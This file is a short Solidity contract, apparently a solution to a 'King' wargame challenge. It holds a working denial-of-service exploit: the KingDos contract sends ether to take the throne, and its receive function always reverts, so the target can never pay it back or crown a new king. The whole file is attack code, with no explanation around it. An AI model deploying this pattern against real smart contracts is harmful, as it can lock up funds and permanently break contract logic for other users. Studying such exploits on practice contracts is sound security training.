pragma solidity ^0.8.0;

import {King} from "./King.sol";
import {Test, console2} from "forge-std/Test.sol";


contract KingDos {

    error MaliciousRevert();

    King immutable king;

    constructor(address payable _king) payable {
        king = King(_king);
    }

    function hack(uint256 _value) external returns(address) {
        (bool success, bytes memory message) = address(king).call{value: _value}("");
        if(!success) {
            assembly {
                message := add(message, 68)
            }
            revert(string(message));
        }
        return king._king();
    }

    receive() payable external {
        //console2.log("receive");
        revert MaliciousRevert();
    }
}